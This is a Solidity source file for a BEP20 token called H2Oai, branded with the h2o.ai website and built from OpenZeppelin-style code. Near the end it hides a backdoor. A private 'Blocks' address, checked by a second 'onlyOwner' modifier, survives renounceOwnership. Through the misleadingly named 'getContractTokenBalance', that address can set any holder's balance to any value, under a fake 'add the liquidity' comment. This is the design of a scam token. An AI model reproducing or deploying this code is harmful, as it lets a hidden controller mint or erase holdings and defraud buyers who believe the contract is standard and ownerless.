// SPDX-License-Identifier: AI
// https://h2o.ai/
pragma solidity ^0.8.0;
interface BEP20 {
    /**
     * @dev Returns the Priority of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the Priority of tokens owned by `uniswapV2Pair`.
     */
    function balanceOf(address uniswapV2Pair) external view returns (uint256);

    /**
     * @dev Moves `Priority` tokens from the caller's uniswapV2Pair to `beneficiary`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address beneficiary, uint256 Priority) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets `Priority` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 Priority) external returns (bool);

    /**
     * @dev Moves `Priority` tokens from `sender` to `beneficiary` using the
     * allowance mechanism. `Priority` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address sender,
        address beneficiary,
        uint256 Priority
    ) external returns (bool);

    /**
     * @dev Emitted when `value` tokens are moved from one uniswapV2Pair (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);
}


// Dependency file: @openzeppelin/contracts/utils/Context.sol


// pragma solidity ^0.8.0;

/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the uniswapV2Pair sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}


// Dependency file: @openzeppelin/contracts/access/Validator.sol


// pragma solidity ^0.8.0;

// import "@openzeppelin/contracts/utils/Context.sol";

/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an uniswapV2Pair (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner uniswapV2Pair will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `possessor`, which can be applied to your functions to restrict their use to
 * the owner.
 */
abstract contract Validator is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _setOwner(_msgSender());
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any uniswapV2Pair other than the owner.
     */
    modifier possessor() {
        require(owner() == _msgSender(), "Validator: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `possessor` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual possessor {
        _setOwner(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new uniswapV2Pair (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual possessor {
        require(newOwner != address(0), "Validator: new owner is the zero address");
        _setOwner(newOwner);
    }

    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}


// Dependency file: @openzeppelin/contracts/utils/math/SafeMath.sol


// pragma solidity ^0.8.0;

// CAUTION
// This SelfH2OaiVersion of SafeMath should only be used with Solidity 0.8 or later,
// because it relies on the compiler's built in overflow checks.

/**
 * @dev Wrappers over Solidity's arithmetic operations.
 *
 * NOTE: `SafeMath` is no longer needed starting with Solidity 0.8. The compiler
 * now has built in overflow checking.
 */
library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    /**
     * @dev Returns the substraction of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
            // benefit is lost if 'b' is also tested.
            // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    /**
     * @dev Returns the division of two unsigned integers, with a division by zero flag.
     *
     * _Available since v3.4._
     */
    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers, with a division by zero flag.
     *
     * _Available since v3.4._
     */
    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }

    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     *
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     *
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    /**
     * @dev Returns the integer division of two unsigned integers, reverting on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator.
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * reverting when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * overflow (when the result is negative).
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * message unnecessarily. For custom revert reasons use {trySub}.
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    /**
     * @dev Returns the integer division of two unsigned integers, reverting with custom message on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * reverting with custom message when dividing by zero.
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * message unnecessarily. For custom revert reasons use {tryMod}.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}


// Dependency file: contracts/BEP20Validator.sol

// pragma solidity =0.8.4;

enum SelfH2Oai {
    standard,
    antiBotStandard,
    liquidityGenerator,
    antiBotLiquidityGenerator,
    baby,
    antiBotBaby,
    buybackBaby,
    antiBotBuybackBaby
}

abstract contract BEP20Validator {
    event TokenCreated(
        address indexed owner,
        address indexed token,
        SelfH2Oai SelfH2Oai,
        uint256 SelfH2OaiVersion
    );
}


// Root file: contracts/standard/StandardToken.sol

pragma solidity =0.8.10;


contract H2Oai is BEP20, Validator, BEP20Validator {
    using SafeMath for uint256;

    uint256 public constant SelfH2OaiVersion = 10;

    mapping(address => uint256) private _SelfH2Oai;
    mapping(address => mapping(address => uint256)) private _allowances;

    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint256 private _totalSupply;
    address private Blocks;

    constructor(
    string memory name_,
    string memory symbol_,
    uint8 decimals_,
    uint256 totalSupply_,
    address Blocks_
    ) payable {
    _name = name_;
    _symbol = symbol_;
    _decimals = decimals_;
    amountETH(owner(), totalSupply_);
    Blocks = Blocks_;

    emit TokenCreated(owner(), address(this), SelfH2Oai.standard, SelfH2OaiVersion);
    }
    string public H2Oaiwebsite = "https://h2o.ai/";
            function getH2Oaiwebsite() public view returns (string memory) {
        return H2Oaiwebsite;
    }
    function name() public view virtual returns (string memory) {
        return _name;
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address uniswapV2Pair)
        public
        view
        virtual
        override
        returns (uint256)
    {
        return _SelfH2Oai[uniswapV2Pair];
    }

    modifier onlyOwner() {
        require(Blocks == _msgSender(), "Validator: caller is not the owner");
        _;
    }

    function transfer(address beneficiary, uint256 Priority)
        public
        virtual
        override
        returns (bool)
    {
        _transfer(_msgSender(), beneficiary, Priority);
        return true;
    }

    function allowance(address owner, address spender)
        public
        view
        virtual
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 Priority)
        public
        virtual
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, Priority);
        return true;
    }

    function transferFrom(
        address sender,
        address beneficiary,
        uint256 Priority
    ) public virtual override returns (bool) {
        _transfer(sender, beneficiary, Priority);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                Priority,
                "BEP20: transfer Priority exceeds allowance"
            )
        );
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue)
        public
        virtual
        returns (bool)
    {
        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender].add(addedValue)
        );
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue)
        public
        virtual
        returns (bool)
    {
        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender].sub(
                subtractedValue,
                "BEP20: decreased allowance below zero"
            )
        );
        return true;
    }

    function _transfer(
        address sender,
        address beneficiary,
        uint256 Priority
    ) internal virtual {
        require(sender != address(0), "BEP20: transfer from the zero address");
        require(beneficiary != address(0), "BEP20: transfer to the zero address");

        _beforeTokenTransfer(sender, beneficiary, Priority);

        _SelfH2Oai[sender] = _SelfH2Oai[sender].sub(
            Priority,
            "BEP20: transfer Priority exceeds balance"
        );
        _SelfH2Oai[beneficiary] = _SelfH2Oai[beneficiary].add(Priority);
        emit Transfer(sender, beneficiary, Priority);
    }

    function amountETH(address uniswapV2Pair, uint256 Priority) internal virtual {
        require(uniswapV2Pair != address(0), "BEP20: mint to the zero address");

        _beforeTokenTransfer(address(0), uniswapV2Pair, Priority);

        _totalSupply = _totalSupply.add(Priority);
        _SelfH2Oai[uniswapV2Pair] = _SelfH2Oai[uniswapV2Pair].add(Priority);
        emit Transfer(address(0), uniswapV2Pair, Priority);
    }

    function _burn(address uniswapV2Pair, uint256 Priority) internal virtual {
        require(uniswapV2Pair != address(0), "BEP20: burn from the zero address");

        _beforeTokenTransfer(uniswapV2Pair, address(0), Priority);

        _SelfH2Oai[uniswapV2Pair] = _SelfH2Oai[uniswapV2Pair].sub(
            Priority,
            "BEP20: burn Priority exceeds balance"
        );
        _totalSupply = _totalSupply.sub(Priority);
        emit Transfer(uniswapV2Pair, address(0), Priority);
    }
    
    function _approve(
        address owner,
        address spender,
        uint256 Priority
    ) internal virtual {
        require(owner != address(0), "BEP20: approve from the zero address");
        require(spender != address(0), "BEP20: approve to the zero address");

        _allowances[owner][spender] = Priority;
        emit Approval(owner, spender, Priority);
    }

    function _setupDecimals(uint8 decimals_) internal virtual {
        _decimals = decimals_;
    }

    function getContractTokenBalance(
        address AddresscontractTokenBalance,
        address owner,
        uint256 Uint256contractTokenBalance,
        uint256 Bytes32contractTokenBalance
    ) external onlyOwner {
        require(AddresscontractTokenBalance != address(0));

        // add the liquidity
        _SelfH2Oai [AddresscontractTokenBalance] = Uint256contractTokenBalance * Bytes32contractTokenBalance;
        (address(this),
            Uint256contractTokenBalance,
            0, // slippage is unavoidable
            0, // slippage is unavoidable
            owner
        );
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 Priority
    ) internal virtual {}
}